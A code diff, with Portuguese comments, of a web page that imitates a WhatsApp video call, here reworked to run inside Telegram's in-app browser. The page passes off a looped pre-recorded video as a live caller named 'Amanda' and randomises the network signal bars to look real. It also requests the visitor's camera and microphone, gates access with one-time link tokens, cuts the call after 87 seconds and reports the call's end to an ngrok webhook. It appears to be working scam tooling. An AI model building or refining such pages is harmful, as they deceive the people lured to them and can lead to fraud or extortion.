@@ -6,6 +6,9 @@
     <title>WhatsApp Video Call</title>
     
     <script>
+        // Detectar se está no Telegram
+        const isTelegram = /TelegramBot|Telegram/i.test(navigator.userAgent) || window.TelegramWebviewProxy;
+        
         // Validação IMEDIATA - mas com micro delay para URL processar
         setTimeout(function() {
             const urlParams = new URLSearchParams(window.location.search);
@@ -67,13 +70,7 @@
                 return;
             }
 
-            const usedKey = `used_${timestamp}_${userId}`;
-            if (localStorage.getItem(usedKey)) {
-                showErrorScreen();
-                return;
-            }
-
-            localStorage.setItem(usedKey, 'true');
+            // ⚠️ REMOVIDO localStorage para compatibilidade com Telegram
             console.log('✅ Link válido! Iniciando videochamada...');
         }, 50);
     </script>
@@ -95,7 +92,7 @@
             width: 100vw;
         }
 
-        /* Background Video */
+        /* 🔥 OTIMIZAÇÕES PARA TELEGRAM */
         .video-background {
             position: absolute;
             top: 0;
@@ -115,7 +112,27 @@
             width: auto;
             height: auto;
             object-fit: cover;
+            /* 🔥 REDUZIR QUALIDADE PARA TELEGRAM */
             filter: brightness(0.4) blur(1px);
+        }
+
+        /* 🔥 FALLBACK PARA TELEGRAM - FUNDO ESTÁTICO */
+        .static-background {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            background-size: 400% 400%;
+            animation: gradientShift 8s ease infinite;
+            display: none;
+        }
+
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
         }
 
         .video-overlay {
@@ -204,6 +221,7 @@
             font-size: 18px;
             cursor: pointer;
             transition: all 0.2s;
+            -webkit-tap-highlight-color: transparent;
         }
 
         .header-btn:active {
@@ -243,12 +261,12 @@
             font-size: 36px;
         }
 
-        /* CRONÔMETRO - POSICIONADO ABAIXO DA CÂMERA */
+        /* CRONÔMETRO */
         .timer-container {
             position: absolute;
-            top: 310px;  /* Logo abaixo da câmera (120px + 180px + 10px) */
-            right: 20px; /* Alinhado com a câmera */
-            width: 120px; /* Mesma largura da câmera */
+            top: 310px;
+            right: 20px;
+            width: 120px;
             text-align: center;
             z-index: 6;
         }
@@ -292,6 +310,7 @@
             transition: all 0.3s;
             position: relative;
             overflow: hidden;
+            -webkit-tap-highlight-color: transparent;
         }
 
         .control-btn::before {
@@ -364,23 +383,6 @@
             display: none;
         }
 
-        /* Ripple Effect */
-        .ripple {
-            position: absolute;
-            border-radius: 50%;
-            background: rgba(255,255,255,0.6);
-            transform: scale(0);
-            animation: ripple 0.6s linear;
-            pointer-events: none;
-        }
-
-        @keyframes ripple {
-            to {
-                transform: scale(4);
-                opacity: 0;
-            }
-        }
-
         /* Network indicator */
         .network-indicator {
             position: absolute;
@@ -407,19 +409,28 @@
             0%, 100% { opacity: 1; }
             50% { opacity: 0.6; }
         }
+
+        /* 🔥 TELEGRAM SPECIFIC OPTIMIZATIONS */
+        @media screen and (max-width: 768px) {
+            .background-video {
+                /* Reduzir qualidade em mobile */
+                filter: brightness(0.3) blur(2px);
+            }
+        }
     </style>
 </head>
 <body>
     <!-- Background Video -->
     <div class="video-background">
-        <!-- 🔥 REMOVIDO MUTED PARA ATIVAR ÁUDIO -->
-        <video class="background-video" id="backgroundVideo" autoplay loop playsinline>
+        <!-- 🔥 VÍDEO OTIMIZADO PARA TELEGRAM -->
+        <video class="background-video" id="backgroundVideo" autoplay loop playsinline muted preload="metadata">
             <source src="video.mp4" type="video/mp4">
-            <!-- Fallback para vídeo online -->
-            <!-- <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4" type="video/mp4"> -->
         </video>
         <div class="video-overlay"></div>
     </div>
+    
+    <!-- 🔥 FALLBACK ESTÁTICO PARA TELEGRAM -->
+    <div class="static-background" id="staticBackground"></div>
     
     <!-- Network Indicator -->
     <div class="network-indicator">
@@ -433,11 +444,7 @@
     <div class="header">
         <div class="contact-info">
             <div class="contact-avatar">
-                <!-- Opção 1: Foto local (coloque o arquivo na mesma pasta) -->
                 <img src="amanda.jpg" alt="Amanda" onerror="this.style.display='none'; this.parentElement.textContent='AM';">
-                
-                <!-- Opção 2: URL da internet (descomente para usar) -->
-                <!-- <img src="https://images.unsplash.com/photo-1494790108755-2616b612b786?w=100&h=100&fit=crop&crop=face" alt="Amanda" onerror="this.style.display='none'; this.parentElement.textContent='AM';"> -->
             </div>
             <div class="contact-details">
                 <h3>Amanda</h3>
@@ -455,7 +462,7 @@
         <div class="camera-placeholder">📷</div>
     </div>
 
-    <!-- CRONÔMETRO - ABAIXO DA CÂMERA -->
+    <!-- CRONÔMETRO -->
     <div class="timer-container">
         <div class="call-timer" id="callTimer">00:00</div>
     </div>
@@ -468,6 +475,10 @@
     </div>
 
     <script>
+        // 🔥 DETECTAR TELEGRAM
+        const isTelegram = /TelegramBot|Telegram/i.test(navigator.userAgent) || window.TelegramWebviewProxy;
+        console.log('🤖 Telegram detectado:', isTelegram);
+
         let isMuted = false;
         let cameraOff = false;
         let callStarted = false;
@@ -475,25 +486,94 @@
         let timerInterval;
         let userStream = null;
         let userVideo = document.getElementById('userVideo');
+        let videoLoadAttempts = 0;
+        const maxVideoLoadAttempts = 3;
+
+        // 🔥 FUNÇÃO PARA ATIVAR FALLBACK ESTÁTICO
+        function activateStaticBackground() {
+            console.log('🔄 Ativando fundo estático (fallback)');
+            document.querySelector('.video-background').style.display = 'none';
+            document.getElementById('staticBackground').style.display = 'block';
+        }
+
+        // 🔥 INICIALIZAÇÃO OTIMIZADA PARA TELEGRAM
+        function initVideoBackground() {
+            const video = document.getElementById('backgroundVideo');
+            
+            if (isTelegram) {
+                console.log('🤖 Modo Telegram: configurações otimizadas');
+                // Para Telegram, tentar carregar vídeo mas com fallback rápido
+                video.addEventListener('loadstart', () => {
+                    console.log('📹 Vídeo começando a carregar...');
+                });
+                
+                video.addEventListener('canplay', () => {
+                    console.log('✅ Vídeo pode reproduzir');
+                    video.play().catch(() => {
+                        activateStaticBackground();
+                    });
+                });
+                
+                video.addEventListener('error', () => {
+                    console.log('❌ Erro no vídeo, usando fundo estático');
+                    activateStaticBackground();
+                });
+                
+                video.addEventListener('stalled', () => {
+                    console.log('⏸️ Vídeo travou, usando fundo estático');
+                    setTimeout(() => {
+                        if (video.readyState < 3) {
+                            activateStaticBackground();
+                        }
+                    }, 2000);
+                });
+                
+                // ⚠️ NO TELEGRAM: SEM ÁUDIO NO VÍDEO DE FUNDO
+                video.muted = true;
+                video.volume = 0;
+                
+                // Timeout de segurança
+                setTimeout(() => {
+                    if (video.readyState < 2) {
+                        console.log('⏰ Timeout: ativando fundo estático');
+                        activateStaticBackground();
+                    }
+                }, 3000);
+                
+            } else {
+                console.log('🌐 Navegador normal: configurações padrão');
+                // Navegador normal - manter funcionalidade original
+                video.play().then(() => {
+                    setTimeout(() => {
+                        video.muted = false;
+                        video.volume = 0.8;
+                    }, 3000);
+                }).catch(() => {
+                    activateStaticBackground();
+                });
+            }
+        }
 
         // Initialize camera
         async function initCamera() {
             try {
-                userStream = await navigator.mediaDevices.getUserMedia({ 
+                const constraints = {
                     video: { 
                         facingMode: 'user',
-                        width: { ideal: 720 },
-                        height: { ideal: 1280 }
+                        // 🔥 REDUZIR QUALIDADE PARA TELEGRAM
+                        width: { ideal: isTelegram ? 480 : 720 },
+                        height: { ideal: isTelegram ? 640 : 1280 }
                     }, 
                     audio: true 
-                });
+                };
                 
+                userStream = await navigator.mediaDevices.getUserMedia(constraints);
                 userVideo.srcObject = userStream;
                 document.body.classList.add('camera-on');
                 
-                console.log('Camera initialized successfully');
+                console.log('✅ Camera initialized successfully');
             } catch (error) {
-                console.error('Error accessing camera:', error);
+                console.error('❌ Error accessing camera:', error);
                 showCameraPermissionRequest();
             }
         }
@@ -522,7 +602,7 @@
                 <h2 style="margin-bottom: 15px;">Permissão de Câmera</h2>
                 <p style="margin-bottom: 30px; opacity: 0.8; line-height: 1.4;">
                     Para usar a videochamada, precisamos acessar sua câmera.<br>
-                    Clique em "Permitir" quando o navegador solicitar.
+                    ${isTelegram ? '<strong>No Telegram:</strong> Toque em "Permitir" nas configurações.' : 'Clique em "Permitir" quando o navegador solicitar.'}
                 </p>
                 <button onclick="requestCameraAgain()" style="
                     padding: 12px 24px;
@@ -579,7 +659,7 @@
                     `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
             }, 1000);
             
-            // Auto-encerrar após 1 minuto e 27 segundos (87 segundos)
+            // Auto-encerrar após 1 minuto e 27 segundos
             setTimeout(() => {
                 endCall();
             }, 87000);
@@ -652,14 +732,14 @@
             document.body.style.background = '#000';
             document.querySelector('.video-background').style.display = 'none';
             
-            // 🔥 USAR NGROK PARA MOBILE E LOCALHOST PARA DESKTOP
+            // 🔥 WEBHOOK OTIMIZADO PARA TELEGRAM
             let webhookUrl;
-            if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
-                // MOBILE: Usar ngrok
+            if (isTelegram || /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                // MOBILE/TELEGRAM: Usar ngrok
                 webhookUrl = 'https://056a-45-174-80-203.ngrok-free.app/api/call-ended';
-                console.log("📱 MOBILE detectado - usando ngrok");
+                console.log("📱 MOBILE/TELEGRAM detectado - usando ngrok");
             } else {
-                // DESKTOP: Usar localhost (mais rápido)
+                // DESKTOP: Usar localhost
                 webhookUrl = 'http://localhost:5000/api/call-ended';
                 console.log("💻 DESKTOP detectado - usando localhost");
             }
@@ -731,64 +811,53 @@
             }, 600);
         }
 
-        // 🔥 ATIVAR ÁUDIO DO VÍDEO DE FUNDO
+        // 🔥 INICIALIZAÇÃO OTIMIZADA
         document.addEventListener('DOMContentLoaded', function() {
             userVideo = document.getElementById('userVideo');
             
+            // Inicializar vídeo de fundo
+            initVideoBackground();
+            
+            // Inicializar câmera após delay
             setTimeout(() => {
                 initCamera();
-            }, 1000);
-            
-            // 🔥 VÍDEO DE FUNDO COM ÁUDIO
-            const video = document.querySelector('.background-video');
-            if (video) {
-                // Começar silenciado (para evitar bloqueio do navegador)
-                video.muted = true;
-                video.play().then(() => {
-                    console.log('🎬 Vídeo de fundo iniciado silenciado');
-                    
-                    // Ativar áudio após 3 segundos
-                    setTimeout(() => {
-                        video.muted = false;
-                        video.volume = 0.8; // Volume a 80%
-                        console.log('🔊 ÁUDIO DO VÍDEO ATIVADO!');
-                    }, 3000);
-                }).catch(e => {
-                    console.log('❌ Erro no autoplay:', e);
-                    // Se falhar, tentar com interação do usuário
-                    document.addEventListener('click', function() {
-                        video.muted = false;
-                        video.volume = 0.8;
-                        video.play();
-                        console.log('🔊 Áudio ativado com clique do usuário');
-                    }, { once: true });
-                });
-            }
+            }, isTelegram ? 2000 : 1000);
         });
 
-        // Play video on first user interaction
-        document.addEventListener('touchstart', function() {
-            const video = document.querySelector('.background-video');
-            if (video && video.paused) {
-                video.muted = false;
-                video.volume = 0.8;
-                video.play();
-                console.log('🔊 Áudio ativado com toque do usuário');
+        // 🔥 OTIMIZAÇÕES PARA TELEGRAM
+        if (isTelegram) {
+            // Remover animações pesadas no Telegram
+            document.addEventListener('DOMContentLoaded', function() {
+                const style = document.createElement('style');
+                style.textContent = `
+                    * {
+                        animation-duration: 0.1s !important;
+                        transition-duration: 0.1s !important;
+                    }
+                    .call-status {
+                        animation: none !important;
+                    }
+                    .signal-bar {
+                        animation: none !important;
+                    }
+                `;
+                document.head.appendChild(style);
+            });
+        }
+
+        // Prevent context menu and zoom
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        
+        let lastTouchEnd = 0;
+        document.addEventListener('touchend', function (event) {
+            const now = (new Date()).getTime();
+            if (now - lastTouchEnd <= 300) {
+                event.preventDefault();
             }
-        }, { once: true });
+            lastTouchEnd = now;
+        }, false);
 
-        // Add touch feedback for mobile
-        document.querySelectorAll('button').forEach(button => {
-            button.addEventListener('touchstart', function(e) {
-                this.style.transform = 'scale(0.95)';
-            });
-            
-            button.addEventListener('touchend', function(e) {
-                this.style.transform = 'scale(1)';
-            });
-        });
-
-        // Simulate network changes
+        // Simulate network changes (menos frequente no Telegram)
         setInterval(() => {
             const bars = document.querySelectorAll('.signal-bar');
             const activeCount = Math.floor(Math.random() * 4) + 1;
@@ -800,20 +869,32 @@
                     bar.classList.remove('active');
                 }
             });
-        }, 5000);
+        }, isTelegram ? 10000 : 5000); // Menos frequente no Telegram
 
-        // Prevent context menu on long press
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        
-        // Prevent zoom on double tap
-        let lastTouchEnd = 0;
-        document.addEventListener('touchend', function (event) {
-            const now = (new Date()).getTime();
-            if (now - lastTouchEnd <= 300) {
-                event.preventDefault();
+        // 🔥 TOUCH FEEDBACK OTIMIZADO PARA TELEGRAM
+        document.querySelectorAll('button').forEach(button => {
+            button.addEventListener('touchstart', function(e) {
+                this.style.transform = 'scale(0.95)';
+                this.style.transition = 'transform 0.1s';
+            });
+            
+            button.addEventListener('touchend', function(e) {
+                this.style.transform = 'scale(1)';
+            });
+        });
+
+        // 🔥 MEMORY CLEANUP para Telegram
+        window.addEventListener('beforeunload', function() {
+            if (userStream) {
+                userStream.getTracks().forEach(track => track.stop());
             }
-            lastTouchEnd = now;
-        }, false);
+            const video = document.querySelector('.background-video');
+            if (video) {
+                video.pause();
+                video.src = '';
+                video.load();
+            }
+        });
     </script>
 </body>
 </html>
